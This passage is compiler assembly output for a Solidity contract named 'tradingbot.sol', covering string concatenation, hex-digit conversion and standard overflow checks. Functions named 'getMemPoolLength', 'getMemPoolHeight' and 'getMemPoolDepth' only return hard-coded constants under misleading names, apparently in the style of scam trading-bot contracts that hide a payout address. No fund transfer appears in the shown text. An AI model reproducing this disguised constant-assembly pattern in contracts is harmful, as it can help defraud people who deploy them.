   pop\n    tag_154:\n      pop\n        /* \"contracts/tradingbot.sol\":12539:12615  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12626:12648  bytes memory _newValue */\n      0x00\n        /* \"contracts/tradingbot.sol\":12657:12666  _tmpValue */\n      dup2\n        /* \"contracts/tradingbot.sol\":12626:12667  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12680:12686  uint i */\n      0x00\n        /* \"contracts/tradingbot.sol\":12697:12703  uint j */\n      dup1\n        /* \"contracts/tradingbot.sol\":12722:12723  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":12720:12723  i=0 */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n    tag_155:\n        /* \"contracts/tradingbot.sol\":12727:12737  _baseBytes */\n      dup6\n        /* \"contracts/tradingbot.sol\":12727:12744  _baseBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12725:12726  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12725:12744  i<_baseBytes.length */\n      lt\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n      iszero\n      tag_156\n      jumpi\n        /* \"contracts/tradingbot.sol\":12783:12793  _baseBytes */\n      dup6\n        /* \"contracts/tradingbot.sol\":12794:12795  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12783:12796  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_158\n      jumpi\n      tag_159\n      tag_79\n      jump\t// in\n    tag_159:\n    tag_158:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":12766:12775  _newValue */\n      dup4\n        /* \"contracts/tradingbot.sol\":12776:12779  j++ */\n      dup3\n      dup1\n      tag_160\n      swap1\n      tag_118\n      jump\t// in\n    tag_160:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":12766:12780  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_161\n      jumpi\n      tag_162\n      tag_79\n      jump\t// in\n    tag_162:\n    tag_161:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":12766:12796  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":12746:12749  i++ */\n      dup2\n      dup1\n      tag_163\n      swap1\n      tag_118\n      jump\t// in\n    tag_163:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12716:12808  for(i=0; i<_baseBytes.length; i++) {... */\n      jump(tag_155)\n    tag_156:\n        /* \"contracts/tradingbot.sol\":12826:12827  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":12824:12827  i=0 */\n      swap2\n      pop\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n    tag_164:\n        /* \"contracts/tradingbot.sol\":12831:12842  _valueBytes */\n      dup5\n        /* \"contracts/tradingbot.sol\":12831:12849  _valueBytes.length */\n      mload\n        /* \"contracts/tradingbot.sol\":12829:12830  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12829:12849  i<_valueBytes.length */\n      lt\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n      iszero\n      tag_165\n      jumpi\n        /* \"contracts/tradingbot.sol\":12888:12899  _valueBytes */\n      dup5\n        /* \"contracts/tradingbot.sol\":12900:12901  i */\n      dup3\n        /* \"contracts/tradingbot.sol\":12888:12902  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_167\n      jumpi\n      tag_168\n      tag_79\n      jump\t// in\n    tag_168:\n    tag_167:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":12871:12880  _newValue */\n      dup4\n        /* \"contracts/tradingbot.sol\":12881:12884  j++ */\n      dup3\n      dup1\n      tag_169\n      swap1\n      tag_118\n      jump\t// in\n    tag_169:\n      swap4\n      pop\n        /* \"contracts/tradingbot.sol\":12871:12885  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_170\n      jumpi\n      tag_171\n      tag_79\n      jump\t// in\n    tag_171:\n    tag_170:\n      0x20\n      add\n      add\n        /* \"contracts/tradingbot.sol\":12871:12902  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/tradingbot.sol\":12851:12854  i++ */\n      dup2\n      dup1\n      tag_172\n      swap1\n      tag_118\n      jump\t// in\n    tag_172:\n      swap3\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12820:12914  for(i=0; i<_valueBytes.length; i++) {... */\n      jump(tag_164)\n    tag_165:\n        /* \"contracts/tradingbot.sol\":12940:12949  _newValue */\n      dup3\n        /* \"contracts/tradingbot.sol\":12926:12950  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":12328:12958  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":6658:6747  function getMemPoolLength() internal pure returns (uint) {... */\n    tag_51:\n        /* \"contracts/tradingbot.sol\":6709:6713  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":6733:6739  300426 */\n      0x04958a\n        /* \"contracts/tradingbot.sol\":6726:6739  return 300426 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":6658:6747  function getMemPoolLength() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":7030:7119  function getMemPoolHeight() internal pure returns (uint) {... */\n    tag_53:\n        /* \"contracts/tradingbot.sol\":7081:7085  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":7105:7111  979684 */\n      0x0ef2e4\n        /* \"contracts/tradingbot.sol\":7098:7111  return 979684 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7030:7119  function getMemPoolHeight() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":12057:12145  function getMemPoolDepth() internal pure returns (uint) {... */\n    tag_55:\n        /* \"contracts/tradingbot.sol\":12107:12111  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":12131:12137  966235 */\n      0x0ebe5b\n        /* \"contracts/tradingbot.sol\":12124:12137  return 966235 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12057:12145  function getMemPoolDepth() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":8676:9013  function toHexDigit(uint8 d) pure internal returns (bytes1) {... */\n    tag_131:\n        /* \"contracts/tradingbot.sol\":8728:8734  bytes1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8756:8757  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8751:8757  0 <= d */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":8751:8752  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8751:8757  0 <= d */\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8751:8767  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_177\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":8766:8767  9 */\n      0x09\n        /* \"contracts/tradingbot.sol\":8761:8762  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8761:8767  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8751:8767  0 <= d && d <= 9 */\n    tag_177:\n        /* \"contracts/tradingbot.sol\":8747:8946  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_178\n      jumpi\n        /* \"contracts/tradingbot.sol\":8819:8820  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8804:8815  bytes1('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/tradingbot.sol\":8798:8816  uint8(bytes1('0')) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":8798:8820  uint8(bytes1('0')) + d */\n      tag_179\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_179:\n        /* \"contracts/tradingbot.sol\":8791:8821  bytes1(uint8(bytes1('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":8784:8821  return bytes1(uint8(bytes1('0')) + d) */\n      swap1\n      pop\n      jump(tag_176)\n        /* \"contracts/tradingbot.sol\":8747:8946  if (0 <= d && d <= 9) {... */\n    tag_178:\n        /* \"contracts/tradingbot.sol\":8855:8856  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8843:8857  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":8843:8845  10 */\n      0x0a\n        /* \"contracts/tradingbot.sol\":8843:8857  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8843:8875  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_182\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":8873:8875  15 */\n      0x0f\n        /* \"contracts/tradingbot.sol\":8867:8868  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8861:8875  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8843:8875  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_182:\n        /* \"contracts/tradingbot.sol\":8839:8946  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_183\n      jumpi\n        /* \"contracts/tradingbot.sol\":8931:8933  10 */\n      0x0a\n        /* \"contracts/tradingbot.sol\":8927:8928  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8912:8923  bytes1('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/tradingbot.sol\":8906:8924  uint8(bytes1('a')) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":8906:8928  uint8(bytes1('a')) + d */\n      tag_184\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_184:\n        /* \"contracts/tradingbot.sol\":8906:8933  uint8(bytes1('a')) + d - 10 */\n      tag_185\n      swap2\n      swap1\n      tag_186\n      jump\t// in\n    tag_185:\n        /* \"contracts/tradingbot.sol\":8899:8934  bytes1(uint8(bytes1('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":8892:8934  return bytes1(uint8(bytes1('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_176)\n        /* \"contracts/tradingbot.sol\":8839:8946  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_183:\n        /* \"contracts/tradingbot.sol\":8997:9005  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/tradingbot.sol\":8676:9013  function toHexDigit(uint8 d) pure internal returns (bytes1) {... */\n    tag_176:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:106   */\n    tag_187:\n        /* \"#utility.yul\":59:65   */\n      0x00\n        /* \"#utility.yul\":93:98   */\n      dup2\n        /* \"#utility.yul\":87:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":112:281   */\n    tag_188:\n        /* \"#utility.yul\":196:207   */\n      0x00\n        /* \"#utility.yul\":230:236   */\n      dup3\n        /* \"#utility.yul\":225:228   */\n      dup3\n        /* \"#utility.yul\":218:237   */\n      mstore\n        /* \"#utility.yul\":270:274   */\n      0x20\n        /* \"#utility.yul\":265:268   */\n      dup3\n        /* \"#utility.yul\":261:275   */\n      add\n        /* \"#utility.yul\":246:275   */\n      swap1\n      pop\n        /* \"#utility.yul\":112:281   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":287:533   */\n    tag_189:\n        /* \"#utility.yul\":368:369   */\n      0x00\n        /* \"#utility.yul\":378:491   */\n    tag_201:\n        /* \"#utility.yul\":392:398   */\n      dup4\n        /* \"#utility.yul\":389:390   */\n      dup2\n        /* \"#utility.yul\":386:399   */\n      lt\n        /* \"#utility.yul\":378:491   */\n      iszero\n      tag_203\n      jumpi\n        /* \"#utility.yul\":477:478   */\n      dup1\n        /* \"#utility.yul\":472:475   */\n      dup3\n        /* \"#utility.yul\":468:479   */\n      add\n        /* \"#utility.yul\":462:480   */\n      mload\n        /* \"#utility.yul\":458:459   */\n      dup2\n        /* \"#utility.yul\":453:456   */\n      dup5\n        /* \"#utility.yul\":449:460   */\n      add\n        /* \"#utility.yul\":442:481   */\n      mstore\n        /* \"#utility.yul\":414:416   */\n      0x20\n        /* \"#utility.yul\":411:412   */\n      dup2\n        /* \"#utility.yul\":407:417   */\n      add\n        /* \"#utility.yul\":402:417   */\n      swap1\n      pop\n        /* \"#utility.yul\":378:491   */\n      jump(tag_201)\n    tag_203:\n        /* \"#utility.yul\":525:526   */\n      0x00\n        /* \"#utility.yul\":516:522   */\n      dup5\n        /* \"#utility.yul\":511:514   */\n      dup5\n        /* \"#utility.yul\":507:523   */\n      add\n        /* \"#utility.yul\":500:527   */\n      mstore\n        /* \"#utility.yul\":349:533   */\n      pop\n        /* \"#utility.yul\":287:533   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":539:641   */\n    tag_190:\n        /* \"#utility.yul\":580:586   */\n      0x00\n        /* \"#utility.yul\":631:633   */\n      0x1f\n        /* \"#utility.yul\":627:634   */\n      not\n        /* \"#utility.yul\":622:624   */\n      0x1f\n        /* \"#utility.yul\":615:620   */\n      dup4\n        /* \"#utility.yul\":611:625   */\n      add\n        /* \"#utility.yul\":607:635   */\n      and\n        /* \"#utility.yul\":597:635   */\n      swap1\n      pop\n        /* \"#utility.yul\":539:641   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:1024   */\n    tag_191:\n        /* \"#utility.yul\":735:738   */\n      0x00\n        /* \"#utility.yul\":763:802   */\n      tag_206\n        /* \"#utility.yul\":796:801   */\n      dup3\n        /* \"#utility.yul\":763:802   */\n      tag_187\n      jump\t// in\n    tag_206:\n        /* \"#utility.yul\":818:889   */\n      tag_207\n        /* \"#utility.yul\":882:888   */\n      dup2\n        /* \"#utility.yul\":877:880   */\n      dup6\n        /* \"#utility.yul\":818:889   */\n      tag_188\n      jump\t// in\n    tag_207:\n        /* \"#utility.yul\":811:889   */\n      swap4\n      pop\n        /* \"#utility.yul\":898:963   */\n      tag_208\n        /* \"#utility.yul\":956:962   */\n      dup2\n        /* \"#utility.yul\":951:954   */\n      dup6\n        /* \"#utility.yul\":944:948   */\n      0x20\n        /* \"#utility.yul\":937:942   */\n      dup7\n        /* \"#utility.yul\":933:949   */\n      add\n        /* \"#utility.yul\":898:963   */\n      tag_189\n      jump\t// in\n    tag_208:\n        /* \"#utility.yul\":988:1017   */\n      tag_209\n        /* \"#utility.yul\":1010:1016   */\n      dup2\n        /* \"#utility.yul\":988:1017   */\n      tag_190\n      jump\t// in\n    tag_209:\n        /* \"#utility.yul\":983:986   */\n      dup5\n        /* \"#utility.yul\":979:1018   */\n      add\n        /* \"#utility.yul\":972:1018   */\n      swap2\n      pop\n        /* \"#utility.yul\":739:1024   */\n      pop\n        /* \"#utility.yul\":647:1024   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1030:1343   */\n    tag_14:\n        /* \"#utility.yul\":1143:1147   */\n      0x00\n        /* \"#utility.yul\":1181:1183   */\n      0x20\n        /* \"#utility.yul\":1170:1179   */\n      dup3\n        /* \"#utility.yul\":1166:1184   */\n      add\n        /* \"#utility.yul\":1158:1184   */\n      swap1\n      pop\n        /* \"#utility.yul\":1230:1239   */\n      dup2\n        /* \"#utility.yul\":1224:1228   */\n      dup2\n        /* \"#utility.yul\":1220:1240   */\n      sub\n        /* \"#utility.yul\":1216:1217   */\n      0x00\n        /* \"#utility.yul\":1205:1214   */\n      dup4\n        /* \"#utility.yul\":1201:1218   */\n      add\n        /* \"#utility.yul\":1194:1241   */\n      mstore\n        /* \"#utility.yul\":1258:1336   */\n      tag_211\n        /* \"#utility.yul\":1331:1335   */\n      dup2\n        /* \"#utility.yul\":1322:1328   */\n      dup5\n        /* \"#utility.yul\":1258:1336   */\n      tag_191\n      jump\t// in\n    tag_211:\n        /* \"#utility.yul\":1250:1336   */\n      swap1\n      pop\n        /* \"#utility.yul\":1030:1343   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1349:1475   */\n    tag_192:\n        /* \"#utility.yul\":1386:1393   */\n      0x00\n        /* \"#utility.yul\":1426:1468   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1419:1424   */\n      dup3\n        /* \"#utility.yul\":1415:1469   */\n      and\n        /* \"#utility.yul\":1404:1469   */\n      swap1\n      pop\n        /* \"#utility.yul\":1349:1475   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1481:1661   */\n    tag_193:\n        /* \"#utility.yul\":1529:1606   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1526:1527   */\n      0x00\n        /* \"#utility.yul\":1519:1607   */\n      mstore\n        /* \"#utility.yul\":1626:1630   */\n      0x11\n        /* \"#utility.yul\":1623:1624   */\n      0x04\n        /* \"#utility.yul\":1616:1631   */\n      mstore\n        /* \"#utility.yul\":1650:1654   */\n      0x24\n        /* \"#utility.yul\":1647:1648   */\n      0x00\n        /* \"#utility.yul\":1640:1655   */\n      revert\n        /* \"#utility.yul\":1667:2077   */\n    tag_76:\n        /* \"#utility.yul\":1707:1714   */\n      0x00\n        /* \"#utility.yul\":1730:1750   */\n      tag_215\n        /* \"#utility.yul\":1748:1749   */\n      dup3\n        /* \"#utility.yul\":1730:1750   */\n      tag_192\n      jump\t// in\n    tag_215:\n        /* \"#utility.yul\":1725:1750   */\n      swap2\n      pop\n        /* \"#utility.yul\":1764:1784   */\n      tag_216\n        /* \"#utility.yul\":1782:1783   */\n      dup4\n        /* \"#utility.yul\":1764:1784   */\n      tag_192\n      jump\t// in\n    tag_216:\n        /* \"#utility.yul\":1759:1784   */\n      swap3\n      pop\n        /* \"#utility.yul\":1819:1820   */\n      dup3\n        /* \"#utility.yul\":1816:1817   */\n      dup3\n        /* \"#utility.yul\":1812:1821   */\n      mul\n        /* \"#utility.yul\":1841:1871   */\n      tag_217\n        /* \"#utility.yul\":1859:1870   */\n      dup2\n        /* \"#utility.yul\":1841:1871   */\n      tag_192\n      jump\t// in\n    tag_217:\n        /* \"#utility.yul\":1830:1871   */\n      swap2\n      pop\n        /* \"#utility.yul\":2020:2021   */\n      dup3\n        /* \"#utility.yul\":2011:2018   */\n      dup3\n        /* \"#utility.yul\":2007:2022   */\n      div\n        /* \"#utility.yul\":2004:2005   */\n      dup5\n        /* \"#utility.yul\":2001:2023   */\n      eq\n        /* \"#utility.yul\":1981:1982   */\n      dup4\n        /* \"#utility.yul\":1974:1983   */\n      iszero\n        /* \"#utility.yul\":1954:2037   */\n      or\n        /* \"#utility.yul\":1931:2070   */\n      tag_218\n      jumpi\n        /* \"#utility.yul\":2050:2068   */\n      tag_219\n      tag_193\n      jump\t// in\n    tag_219:\n        /* \"#utility.yul\":1931:2070   */\n    tag_218:\n        /* \"#utility.yul\":1715:2077   */\n      pop\n        /* \"#utility.yul\":1667:2077   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2083:2263   */\n    tag_79:\n        /* \"#utility.yul\":2131:2208   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2128:2129   */\n      0x00\n        /* \"#utility.yul\":2121:2209   */\n      mstore\n        /* \"#utility.yul\":2228:2232   */\n      0x32\n        /* \"#utility.yul\":2225:2226   */\n      0x04\n        /* \"#utility.yul\":2218:2233   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x24\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2242:2257   */\n      revert\n        /* \"#utility.yul\":2269:2346   */\n    tag_194:\n        /* \"#utility.yul\":2306:2313   */\n      0x00\n        /* \"#utility.yul\":2335:2340   */\n      dup2\n        /* \"#utility.yul\":2324:2340   */\n      swap1\n      pop\n        /* \"#utility.yul\":2269:2346   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2352:2543   */\n    tag_81:\n        /* \"#utility.yul\":2392:2395   */\n      0x00\n        /* \"#utility.yul\":2411:2431   */\n      tag_223\n        /* \"#utility.yul\":2429:2430   */\n      dup3\n        /* \"#utility.yul\":2411:2431   */\n      tag_194\n      jump\t// in\n    tag_223:\n        /* \"#utility.yul\":2406:2431   */\n      swap2\n      pop\n        /* \"#utility.yul\":2445:2465   */\n      tag_224\n        /* \"#utility.yul\":2463:2464   */\n      dup4\n        /* \"#utility.yul\":2445:2465   */\n      tag_194\n      jump\t// in\n    tag_224:\n        /* \"#utility.yul\":2440:2465   */\n      swap3\n      pop\n        /* \"#utility.yul\":2488:2489   */\n      dup3\n        /* \"#utility.yul\":2485:2486   */\n      dup3\n        /* \"#utility.yul\":2481:2490   */\n      add\n        /* \"#utility.yul\":2474:2490   */\n      swap1\n      pop\n        /* \"#utility.yul\":2509:2512   */\n      dup1\n        /* \"#utility.yul\":2506:2507   */\n      dup3\n        /* \"#utility.yul\":2503:2513   */\n      gt\n        /* \"#utility.yul\":2500:2536   */\n      iszero\n      tag_225\n      jumpi\n        /* \"#utility.yul\":2516:2534   */\n      tag_226\n      tag_193\n      jump\t// in\n    tag_226:\n        /* \"#utility.yul\":2500:2536   */\n    tag_225:\n        /* \"#utility.yul\":2352:2543   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2549:2784   */\n    tag_87:\n        /* \"#utility.yul\":2589:2593   */\n      0x00\n        /* \"#utility.yul\":2609:2629   */\n      tag_228\n        /* \"#utility.yul\":2627:2628   */\n      dup3\n        /* \"#utility.yul\":2609:2629   */\n      tag_192\n      jump\t// in\n    tag_228:\n        /* \"#utility.yul\":2604:2629   */\n      swap2\n      pop\n        /* \"#utility.yul\":2643:2663   */\n      tag_229\n        /* \"#utility.yul\":2661:2662   */\n      dup4\n        /* \"#utility.yul\":2643:2663   */\n      tag_192\n      jump\t// in\n    tag_229:\n        /* \"#utility.yul\":2638:2663   */\n      swap3\n      pop\n        /* \"#utility.yul\":2687:2688   */\n      dup3\n        /* \"#utility.yul\":2684:2685   */\n      dup3\n        /* \"#utility.yul\":2680:2689   */\n      sub\n        /* \"#utility.yul\":2672:2689   */\n      swap1\n      pop\n        /* \"#utility.yul\":2711:2753   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2705:2709   */\n      dup2\n        /* \"#utility.yul\":2702:2754   */\n      gt\n        /* \"#utility.yul\":2699:2777   */\n      iszero\n      tag_230\n      jumpi\n        /* \"#utility.yul\":2757:2775   */\n      tag_231\n      tag_193\n      jump\t// in\n    tag_231:\n        /* \"#utility.yul\":2699:2777   */\n    tag_230:\n        /* \"#utility.yul\":2549:2784   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2790:3022   */\n    tag_109:\n        /* \"#utility.yul\":2830:2833   */\n      0x00\n        /* \"#utility.yul\":2849:2869   */\n      tag_233\n        /* \"#utility.yul\":2867:2868   */\n      dup3\n        /* \"#utility.yul\":2849:2869   */\n      tag_192\n      jump\t// in\n    tag_233:\n        /* \"#utility.yul\":2844:2869   */\n      swap2\n      pop\n        /* \"#utility.yul\":2883:2903   */\n      tag_234\n        /* \"#utility.yul\":2901:2902   */\n      dup4\n        /* \"#utility.yul\":2883:2903   */\n      tag_192\n      jump\t// in\n    tag_234:\n        /* \"#utility.yul\":2878:2903   */\n      swap3\n      pop\n        /* \"#utility.yul\":2926:2927   */\n      dup3\n        /* \"#utility.yul\":2923:2924   */\n      dup3\n        /* \"#utility.yul\":2919:2928   */\n      add\n        /* \"#utility.yul\":2912:2928   */\n      swap1\n      pop\n        /* \"#utility.yul\":2949:2991   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2944:2947   */\n      dup2\n        /* \"#utility.yul\":2941:2992   */\n      gt\n        /* \"#utility.yul\":2938:3015   */\n      iszero\n      tag_235\n      jumpi\n        /* \"#utility.yul\":2995:3013   */\n      tag_236\n      tag_193\n      jump\t// in\n    tag_236:\n        /* \"#utility.yul\":2938:3015   */\n    tag_235:\n        /* \"#utility.yul\":2790:3022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3028:3261   */\n    tag_118:\n        /* \"#utility.yul\":3067:3070   */\n      0x00\n        /* \"#utility.yul\":3090:3114   */\n      tag_238\n        /* \"#utility.yul\":3108:3113   */\n      dup3\n        /* \"#utility.yul\":3090:3114   */\n      tag_194\n      jump\t// in\n    tag_238:\n        /* \"#utility.yul\":3081:3114   */\n      swap2\n      pop\n        /* \"#utility.yul\":3136:3202   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3129:3134   */\n      dup3\n        /* \"#utility.yul\":3126:3203   */\n      sub\n        /* \"#utility.yul\":3123:3226   */\n      tag_239\n      jumpi\n        /* \"#utility.yul\":3206:3224   */\n      tag_240\n      tag_193\n      jump\t// in\n    tag_240:\n        /* \"#utility.yul\":3123:3226   */\n    tag_239:\n        /* \"#utility.yul\":3253:3254   */\n      0x01\n        /* \"#utility.yul\":3246:3251   */\n      dup3\n        /* \"#utility.yul\":3242:3255   */\n      add\n        /* \"#utility.yul\":3235:3255   */\n      swap1\n      pop\n        /* \"#utility.yul\":3028:3261   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3267:3447   */\n    tag_195:\n        /* \"#utility.yul\":3315:3392   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3312:3313   */\n      0x00\n        /* \"#utility.yul\":3305:3393   */\n      mstore\n        /* \"#utility.yul\":3412:3416   */\n      0x12\n        /* \"#utility.yul\":3409:3410   */\n      0x04\n        /* \"#utility.yul\":3402:3417   */\n      mstore\n        /* \"#utility.yul\":3436:3440   */\n      0x24\n        /* \"#utility.yul\":3433:3434   */\n      0x00\n        /* \"#utility.yul\":3426:3441   */\n      revert\n        /* \"#utility.yul\":3453:3638   */\n    tag_120:\n        /* \"#utility.yul\":3493:3494   */\n      0x00\n        /* \"#utility.yul\":3510:3530   */\n      tag_243\n        /* \"#utility.yul\":3528:3529   */\n      dup3\n        /* \"#utility.yul\":3510:3530   */\n      tag_194\n      jump\t// in\n    tag_243:\n        /* \"#utility.yul\":3505:3530   */\n      swap2\n      pop\n        /* \"#utility.yul\":3544:3564   */\n      tag_244\n        /* \"#utility.yul\":3562:3563   */\n      dup4\n        /* \"#utility.yul\":3544:3564   */\n      tag_194\n      jump\t// in\n    tag_244:\n        /* \"#utility.yul\":3539:3564   */\n      swap3\n      pop\n        /* \"#utility.yul\":3583:3584   */\n      dup3\n        /* \"#utility.yul\":3573:3608   */\n      tag_245\n      jumpi\n        /* \"#utility.yul\":3588:3606   */\n      tag_246\n      tag_195\n      jump\t// in\n    tag_246:\n        /* \"#utility.yul\":3573:3608   */\n    tag_245:\n        /* \"#utility.yul\":3630:3631   */\n      dup3\n        /* \"#utility.yul\":3627:3628   */\n      dup3\n        /* \"#utility.yul\":3623:3632   */\n      div\n        /* \"#utility.yul\":3618:3632   */\n      swap1\n      pop\n        /* \"#utility.yul\":3453:3638   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3644:3824   */\n    tag_123:\n        /* \"#utility.yul\":3692:3769   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3689:3690   */\n      0x00\n        /* \"#utility.yul\":3682:3770   */\n      mstore\n        /* \"#utility.yul\":3789:3793   */\n      0x41\n        /* \"#utility.yul\":3786:3787   */\n      0x04\n        /* \"#utility.yul\":3779:3794   */\n      mstore\n        /* \"#utility.yul\":3813:3817   */\n      0x24\n        /* \"#utility.yul\":3810:3811   */\n      0x00\n        /* \"#utility.yul\":3803:3818   */\n      revert\n        /* \"#utility.yul\":3830:4006   */\n    tag_129:\n        /* \"#utility.yul\":3862:3863   */\n      0x00\n        /* \"#utility.yul\":3879:3899   */\n      tag_249\n        /* \"#utility.yul\":3897:3898   */\n      dup3\n        /* \"#utility.yul\":3879:3899   */\n      tag_194\n      jump\t// in\n    tag_249:\n        /* \"#utility.yul\":3874:3899   */\n      swap2\n      pop\n        /* \"#utility.yul\":3913:3933   */\n      tag_250\n        /* \"#utility.yul\":3931:3932   */\n      dup4\n        /* \"#utility.yul\":3913:3933   */\n      tag_194\n      jump\t// in\n    tag_250:\n        /* \"#utility.yul\":3908:3933   */\n      swap3\n      pop\n        /* \"#utility.yul\":3952:3953   */\n      dup3\n        /* \"#utility.yul\":3942:3977   */\n      tag_251\n      jumpi\n        /* \"#utility.yul\":3957:3975   */\n      